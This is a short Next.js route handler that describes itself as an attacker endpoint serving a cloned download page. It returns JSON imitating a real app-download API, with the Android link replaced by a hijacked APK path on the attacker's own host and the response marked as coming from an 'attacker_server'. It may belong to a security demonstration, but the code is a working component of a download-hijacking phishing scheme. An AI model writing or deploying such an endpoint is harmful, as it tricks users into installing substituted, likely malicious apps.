import { NextRequest, NextResponse } from "next/server";
import { HIJACK_APK_PATH } from "@/lib/config";

/** Pure attacker endpoint (no real API fetch) — used by clone page fallback */
export async function GET(req: NextRequest) {
  const host = req.headers.get("host") || "localhost:3000";
  const proto = req.headers.get("x-forwarded-proto") || "http";
  const url = `${proto}://${host}${HIJACK_APK_PATH}`;

  return NextResponse.json({
    success: true,
    code: 0,
    msg: "",
    data: [
      { type: "android", url },
      { type: "apple", url: "#" },
    ],
    _source: "attacker_server",
  });
}
